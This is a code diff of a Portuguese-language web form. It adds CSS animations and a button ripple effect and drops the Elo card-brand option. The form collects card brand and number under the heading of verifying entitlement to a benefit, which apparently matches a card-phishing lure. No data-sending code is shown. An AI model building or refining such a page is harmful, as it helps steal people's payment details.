@@ -30,6 +30,7 @@
             --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
             --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
             --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            --animation-duration: 0.5s;
         }
 
         * {
@@ -57,6 +58,7 @@
             top: 0;
             z-index: 100;
             border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+            animation: slideDown var(--animation-duration) ease-out;
         }
 
         .header-container {
@@ -141,6 +143,7 @@
             perspective: 1000px;
             transition: var(--transition);
             position: relative;
+            animation: fadeInUp var(--animation-duration) ease-out;
         }
 
         .card:hover {
@@ -387,11 +390,6 @@
             animation: spin 1s linear infinite;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
         .success-message {
             display: none;
             background-color: rgba(56, 161, 105, 0.1);
@@ -418,11 +416,6 @@
             margin-bottom: 1.5rem;
             border: 1px solid rgba(229, 62, 62, 0.3);
             animation: fadeIn 0.5s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
         }
 
         .validation-error {
@@ -547,6 +540,54 @@
             left: -100px;
         }
 
+        .preview-image {
+            max-width: 100%;
+            max-height: 150px;
+            margin-top: 10px;
+            border-radius: 8px;
+            display: none;
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+
+        .preview-image:hover {
+            transform: scale(1.02);
+        }
+
+        /* Animações */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            from { 
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideDown {
+            from { 
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            to { 
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsividade */
         @media (max-width: 768px) {
             .header-container {
                 padding: 0 1.5rem;
@@ -601,12 +642,28 @@
             }
         }
 
-        .preview-image {
-            max-width: 100%;
-            max-height: 150px;
-            margin-top: 10px;
-            border-radius: 8px;
-            display: none;
+        /* Efeito de onda no botão */
+        .btn-effect {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.5);
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            border-radius: 50%;
+            animation: btnWave 0.6s linear;
+            opacity: 0;
+        }
+
+        @keyframes btnWave {
+            0% {
+                width: 0;
+                height: 0;
+                opacity: 0.5;
+            }
+            100% {
+                width: 500px;
+                height: 500px;
+                opacity: 0;
+            }
         }
     </style>
 </head>
@@ -733,7 +790,6 @@
                                 <option value="">Selecione a bandeira do cartão...</option>
                                 <option value="visa">Visa</option>
                                 <option value="mastercard">Mastercard</option>
-                                <option value="elo">Elo</option>
                                 <option value="amex">American Express</option>
                             </select>
                             <div class="validation-error" id="bandeiraError">Por favor, selecione uma bandeira</div>
@@ -767,7 +823,7 @@
                             <p>Processando sua verificação...</p>
                         </div>
                         
-                        <button type="submit" class="btn">
+                        <button type="submit" class="btn" id="submitBtn">
                             <i class="fas fa-check-circle"></i> Verificar Direito ao Benefício
                         </button>
                     </form>
@@ -793,6 +849,25 @@
             document.getElementById('successMessage').style.display = 'none';
             document.getElementById('errorMessage').style.display = 'none';
             document.getElementById('loadingSpinner').style.display = 'none';
+        });
+
+        // Efeito de onda no botão
+        document.getElementById('submitBtn').addEventListener('click', function(e) {
+            const btn = e.target;
+            const rect = btn.getBoundingClientRect();
+            const x = e.clientX - rect.left;
+            const y = e.clientY - rect.top;
+            
+            const effect = document.createElement('span');
+            effect.className = 'btn-effect';
+            effect.style.left = `${x}px`;
+            effect.style.top = `${y}px`;
+            
+            btn.appendChild(effect);
+            
+            setTimeout(() => {
+                effect.remove();
+            }, 600);
         });
 
         // Atualizar barra de progresso conforme o formulário é preenchido
@@ -1302,8 +1377,6 @@
                 bandeiraSelect.value = 'mastercard';
             } else if (/^3[47]/.test(numero)) {
                 bandeiraSelect.value = 'amex';
-            } else if (/^(?:6(?:011|5[0-9]{2}))/.test(numero)) {
-                bandeiraSelect.value = 'elo';
             } else {
                 bandeiraSelect.value = '';
             }
